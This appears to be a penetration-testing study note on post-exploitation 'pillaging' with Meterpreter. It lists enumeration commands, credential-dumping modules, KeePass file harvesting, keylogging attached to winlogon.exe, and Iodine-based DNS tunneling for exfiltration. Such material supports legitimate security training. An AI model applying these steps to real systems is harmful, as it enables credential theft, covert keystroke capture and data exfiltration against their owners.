

---

* **Pillaging Overview**
  - Goal: Gather as much data as possible—system info, apps, services, networks, docs, messaging.
  - Focus: System role (workstation/server), users, network, installed apps, credentials.

---

* **Basic Information Gathering**  
  - `sysinfo`: Basic system info (works on Windows/Linux).
  - `getuid`: Check current user on the target machine.

---

* **Identify Machine Role**
  - **Questions to ask**:
    - Workstation or Server?
    - What department? (e.g., R&D, Marketing, etc.)
    - Type of server? (e.g., Mail, Web, RADIUS)
  - **Commands**:
    - `enum_services`: Get all services, user, startup type, binary path.
    - **Windows**: `wmic service get Caption, StartName, State, pathname`
    - **Linux**: `service --status-all`
    - `net start`: List running services (DNS, IIS indicate server roles).

---

* **Processes and Services**
  - `ps`: List running processes.
  - `net view /domain`: Check if the machine is part of a domain.
  - `net group “Domain Controllers” /domain`: List domain controllers.
  
---

* **User & Group Enumeration**
  - **Windows**: `net user`, `net user /domain`
  - **Linux**: `cat /etc/passwd`
  - **Groups**: `net localgroup [group_name]`
  
---

* **Shared Resources**
  - `net share`: List shared resources.
  - `enum_shares`: Meterpreter equivalent.

---

* **Credential Dumping**
  - Metasploit Modules: `post/windows/gather/credentials`, `post/multi/gather/`
  - **Specific Examples**:
    - `enum_chrome`: Gather Chrome credentials.
    - External tools: Nirsoft’s Web Browser Pass View for browser credentials.
  
---

* **File Harvesting**
  - **Search Files**:
    - `search -d C:\\Users\\els\\ -f *.kdbx`: Search for KeePass databases.
  - **Download**: `download [file]` to retrieve files locally (e.g., IM logs, FTP client files).
  
---
* **Keystroke Logging**
  - **Keylogger**:
    - `keyscan_start`: Start keylogger.
    - `keyscan_dump`: Dump keystrokes.
    - `keyscan_stop`: Stop the keylogger.
  - **Attach to Process**:
    - For screen unlock credentials: Attach to `winlogon.exe`.
    - For app usage: Attach to `explorer.exe`.

---

* **Automation Tools**
  - **scraper**: Harvests system information including network shares, registry hives, and password hashes.
  - **winenum**: Retrieves various system information, such as environment variables, network interfaces, routing, user accounts, and more.

---
* **DNS Tunneling for Exfiltration**

Malicious actors often aim to exfiltrate sensitive data using protocols that aren't typically monitored. One common method is **DNS Tunneling**, where DNS traffic is used to exfiltrate data due to its low visibility in many organizations.

* **DNS Tunneling Process**
  - **Client**: Initiates a connection to the attacker's DNS tunnel server through the target organization's DNS server.
  - **Data Encoding**: Traffic is encoded as DNS queries (usually TXT records).
  - **Server**: The attacker-controlled DNS server decodes the traffic.

* **Useful Tools**
  - **Iodine**: A tool for DNS tunneling.
    - Download link: [Iodine tool](https://code.kryo.se/iodine/)

* **Iodine Usage**
  - Useful for bypassing internet restrictions, such as authenticated proxies or captive portals.
  - Can exfiltrate data through DNS queries, bypassing firewalls and proxy restrictions.

* **Requirements for DNS Tunneling with Iodine**
  1. Control over a domain name and its DNS configuration.
  2. An IP address acting as the authoritative Name Server, with SSH access to that server.

* **Steps to Implement DNS Tunneling with Iodine**
  1. Set up a domain name (e.g., register via GoDaddy).
  2. Configure an IP address (hosted on a VPS) to act as the DNS server for the domain.
  3. Establish the DNS tunnel:
     - Client component connects to the server via the domain's DNS.
     - All traffic is tunneled through an SSH SOCKS proxy over DNS.

